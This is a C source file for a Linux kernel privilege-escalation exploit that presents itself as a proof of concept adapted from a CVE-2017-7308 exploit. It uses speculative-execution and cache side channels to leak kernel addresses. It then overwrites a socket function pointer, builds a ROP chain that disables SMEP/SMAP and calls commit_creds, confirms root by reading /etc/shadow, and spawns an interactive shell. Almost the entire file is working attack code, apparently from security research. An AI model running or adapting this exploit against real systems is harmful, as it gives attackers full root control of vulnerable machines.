#define _GNU_SOURCE

#include "envprep.h"
#include "memprep.h"
#include "memwrite.h"
#include "specex_utils.h"
#include "specex_leaks.h"
#include "matrix.h"
#include "llc_prime_probe.h"
#include "config.h"

#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/if_packet.h>
#include <net/if.h>

struct timespec total_exec_start;
void start_timer_total_exec() {
  clock_gettime(CLOCK_MONOTONIC, &total_exec_start);
}

void stop_timer_total_exec() {
  struct timespec total_exec_finish;
  clock_gettime(CLOCK_MONOTONIC, &total_exec_finish);

  double total_exec_elapsed = (total_exec_finish.tv_sec - total_exec_start.tv_sec);
  total_exec_elapsed += (total_exec_finish.tv_nsec - total_exec_start.tv_nsec) / 1000000000.0;
  char mod[] = "\033[1;4;93m"; // bold;underline;high-intensity-yellow
  char nomod[] = "\033[00m";
  printf("\n%s[#] Total execution time of PoC: %.3f sec%s\n", mod, total_exec_elapsed, nomod);
}

// CHECK IF ROOT and POP SHELL!
void exec_shell() {
	char *shell = "/bin/bash";
	char *args[] = {shell, "-i", NULL};
	execve(shell, args, NULL);
}

void fork_shell() {
	pid_t rv;

	rv = fork();
	if (rv == -1) {
		perror("[-] fork()");
		exit(EXIT_FAILURE);
	}

	if (rv == 0) {
		exec_shell();
	}
}

bool is_root() {
	// We can't simple check uid, since we're running inside a namespace
	// with uid set to 0. Try opening /etc/shadow instead.
	int fd = open("/etc/shadow", O_RDONLY);
	if (fd == -1)
		return false;
	close(fd);
	return true;
}

int check_root() {
	printf("[.] checking if we got root\n");

	if (!is_root()) {
		printf("[-] something went wrong =(\n");
		return 0;
	}

	printf("[+] got r00t ^_^\n");

	return 1;
}

#define GADGET_STACK_PIVOT    0x2fcfa2ul
#define GADGET_POP_RSP          0x2052ul
#define GADGET_POP_RDX        0x465b56ul
#define GADGET_MOV_RAX_CR4     0x1b224ul // move cr4 into rax (intel syntax)
#define GADGET_AND_RAX_RDX    0x1a7d3dul // and rax with rdx and store result in rax (intel syntax)
#define GADGET_SAVE_RAX       0x17b453ul
#define GADGET_POP_RDI        0x244f5dul
#define GADGET_MOV_CR4_RDI     0x1b3c0ul // move rdi into cr4 (intel syntax)
#define OFFSET_COMMIT_CREDS          0xa5e30ul
#define OFFSET_PREPARE_KERNEL_CRED   0xa61b0ul

unsigned long core_rop_chain_base = 0x0;
int priv_elevated = 0;

int (*commit_creds)(void*) = NULL;
void* (*prepare_kernel_cred)(void*) = NULL;

__attribute__((used, noinline))
void elevate_priv() {
  commit_creds(prepare_kernel_cred(NULL));
  priv_elevated = 1;
}

__attribute__((used, noinline))
void userspace_wrapper() {
  asm volatile (
    " mov %%gs:0x16a04, %%rax\n"
    " sub $0x3e8, %%rax\n"
    " mov %%rax, %%rsp\n"
    " call elevate_priv\n"
    " ret\n"
  : /* no output */
  : /* no input */
  : "rax", "rsp");
}

__attribute__((noinline))
void write_payload(unsigned long socket_addr, unsigned long kernel_image_addr) {
  char buffer[256];
  int size;

  // Disable speculative exuection by restoring the flags in specex socket.
  // Flags:
  // - SOCK_ZAPPED            0x0100 <- originally the only one set
  // - SOCK_USE_WRITE_QUEUE   0x0200 <- unset (enables spec.exec. when set)
  // - SOCK_DBG               0x0400 <- unset
  set_arb_mem_writer_pos(0x800 + SKC_FLAGS_OFFSET - 40); // change offset in fptr_writer socket
  write_skc_flags(0x0100);

  printf("\n[.] restored conditional branch flag of speculative execution socket object to exploit it for 'real' control-flow hijacking\n");
  fflush(stdout);
  usleep(50000);

  core_rop_chain_base = socket_addr + 0x600; // core rop chain base at 0xe00 in page (0x800 (socket obj offset) + 0x600);

  // stack pivoting
  // 1: write stack pivot address
  write_fptr(specex_socket_second, kernel_image_addr + GADGET_STACK_PIVOT, 8); // push rbx ; or byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
  printf("\n[.] overwrote the function pointer with the stack pivoting gadget\n");
  fflush(stdout);
  usleep(50000);

  // 2: make rsp point to core rop chain
  set_arb_mem_writer_pos(0x800); // make writer point to base of socket where few gadget data will be written
  memset(buffer, 0, sizeof(buffer));
  size = 0;
  *(unsigned long*) (buffer +  0x8) = 0x0; // => popped into RBP #note that least significant 2 bytes are not written. see oob_write below.
  size += 8;
  *(unsigned long*) (buffer +  0x8) = kernel_image_addr + GADGET_POP_RSP; // pop rsp ; pop rbp ; ret
  size += 8;
  *(unsigned long*) (buffer + 0x10) = core_rop_chain_base; // => popped into RSP
  size += 8;
  print_status_blocks(arb_mem_writer->iov);
  oob_write(buffer+2, size-2);
  usleep(50000);

  // write core rop chain
  // 1: prepare chain
  set_arb_mem_writer_pos(0x800 + 0x600); // make writer point to rop chain location
  memset(buffer, 0, sizeof(buffer));
  size = 0;
  // 1.1: finish GADGET_POP_RSP
  *(unsigned long*) (buffer + size) = 0x0; // => popped into RBP
  size += 8;
  // 1.2: load CR4 into RAX
  *(unsigned long*) (buffer + size) = kernel_image_addr + GADGET_MOV_RAX_CR4; // mov rax, cr4 ; pop rbp ; ret
  size += 8 + 8;
  // 1.3: unset SMAP/SMEP registers in RAX
  *(unsigned long*) (buffer + size) = kernel_image_addr + GADGET_POP_RDX; // pop rdx ; ret
  size += 8;
  *(unsigned long*) (buffer + size) = 0xffffffffffcfffff; // => popped into RDX #mask with SMAP and SMEP bits (21,20) unset
  size += 8;
  *(unsigned long*) (buffer + size) = kernel_image_addr + GADGET_AND_RAX_RDX; // and rax, rdx ; ret
  size += 8;
  // 1.4: move RAX to RDI
  *(unsigned long*) (buffer + size) = kernel_image_addr + GADGET_POP_RDX; // pop rdx ; ret
  size += 8;
  *(unsigned long*) (buffer + size) = core_rop_chain_base + size + 0x18; // => popped into RDX #pointing to the placeholder for updated CR4, see below
  size += 8;
  *(unsigned long*) (buffer + size) = kernel_image_addr + GADGET_SAVE_RAX; // mov qword ptr [rdx], rax ; ret
  size += 8;
  // 1.5: move RDI to CR4
  *(unsigned long*) (buffer + size) = kernel_image_addr + GADGET_POP_RDI; // pop rdi ; ret
  size += 8;
  *(unsigned long*) (buffer + size) = 0xdeadbeefdeadbeef; // => popped into RDI #placeholder for the updated CR4 value
  size += 8;
  *(unsigned long*) (buffer + size) = kernel_image_addr + GADGET_MOV_CR4_RDI; // mov cr4, rdi ; pop rbp ; ret
  size += 8 + 8;
  // 1.6: change control flow to user space
  *(unsigned long*) (buffer + size) = (unsigned long) &userspace_wrapper;
  size += 8;

  print_status_blocks(arb_mem_writer->iov);
  oob_write(buffer+2, size-2);

  printf("[.] crafted and wrote the ROP chain in page 0x%lx.\n", (unsigned long) (socket_addr - 0x800));
  fflush(stdout);
  usleep(50000);
}

void execute_payload() {
  char buffer[16];
  int size = sizeof(buffer);
  struct sockaddr_ll sa;
  memset(&sa, 0, sizeof(sa));
  sa.sll_ifindex = if_nametoindex("lo");
  sa.sll_halen = ETH_ALEN;

  printf("[.] triggering ROP chain..\n");
  fflush(stdout);
  sleep(2);

  sendto(specex_socket_second, buffer, size, 0, (struct sockaddr *)&sa, sizeof(sa));

  printf("[.] triggering ROP chain.. DONE\n");
}

void init_matrices();
int main(int argc, char **argv) {
	srand(time(NULL));

  printf("[#] This PoC exploit is a modified version of\n");
  printf("[#]  https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-7308/poc.c\n");
  printf("[#] So you might recognize overlapping lines.\n");

	printf("\n[.] starting\n");
	start_timer_total_exec();

	setup_sandbox();

  set_cpu(MAIN_THREAD_CPU_ID);

  init_matrices();

  printf("\n[.] find LLC eviction sets..\n");
  printf("[.] using eviction set generation method: %s\n", PP_EVICSET_GEN_METHOD);
  pp_create_eviction_sets(PP_EVICSET_GEN_METHOD, LLC_SIZE_IN_MB, LLC_ASSOCIATIVITY);
  printf("[.] find LLC eviction sets.. DONE\n");

  prepare_memory_layout();
  find_necessary_items();
  free_unneeded_objects();

  init_specex_leaks();

  start_flag_eviction_in_co_thread();

  unsigned long kernel_base_address = find_kernel_image();
  commit_creds = (int (*)(void*)) (kernel_base_address + OFFSET_COMMIT_CREDS);
  prepare_kernel_cred = (void* (*)(void*)) (kernel_base_address + OFFSET_PREPARE_KERNEL_CRED);

  unsigned long heap_base_address = find_heap_base_2deref(kernel_base_address);

  unsigned long oob_write_addr = find_oob_write_location_3deref(kernel_base_address, heap_base_address);

  write_payload(oob_write_addr + 0x800, kernel_base_address); // write payload at the specex socket

  // Execute rop payload by triggering function function pointer execution
  execute_payload(); // trigger payload with the specex socket

  // fork+exec a shell if root
  int got_root = check_root();
  stop_timer_total_exec();

  if (got_root) {
    // Fork and exec instead of just doing the exec to avoid potential
    // memory corruptions when closing packet sockets.
    fork_shell();
  }

  close_specex_leaks();

  // stop flag evicting thread
  stop_co_thread();

  pp_close();

  // make poc process sleep infinitely
  fflush(stdout);
  fflush(stderr);
	while (1) sleep(1000);

	return 0;
}
